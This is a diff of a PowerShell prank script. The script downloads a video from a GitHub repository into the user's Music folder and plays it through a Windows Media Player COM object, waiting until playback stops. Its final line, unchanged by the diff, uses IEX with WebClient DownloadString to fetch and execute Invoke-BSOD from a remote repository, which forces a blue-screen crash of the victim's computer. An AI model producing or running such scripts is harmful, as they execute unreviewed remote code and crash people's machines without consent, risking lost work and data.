@@ -20,10 +20,17 @@ Set-Location -Path $env:USERPROFILE\Music
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/NiceComputer.mp4" -OutFile "NiceComputer.mp4"
 
 # Play the video
-$process = Start-Process -FilePath "NiceComputer.mp4" -PassThru
+$mediaPlayer = New-Object -ComObject WMPlayer.OCX
+$mediaPlayer.URL = "NiceComputer.mp4"
+$mediaPlayer.controls.play()
 
-# Wait for the video player process to finish
-$process.WaitForExit()
+# Introduce delay to allow media player to start playing
+Start-Sleep -Seconds 2
+
+# Monitor video playback status
+do {
+    Start-Sleep -Seconds 1
+} until ($mediaPlayer.playState -eq 0) # playState 0 represents stopped state
 
 # Run the next part of the script after video playback
 IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
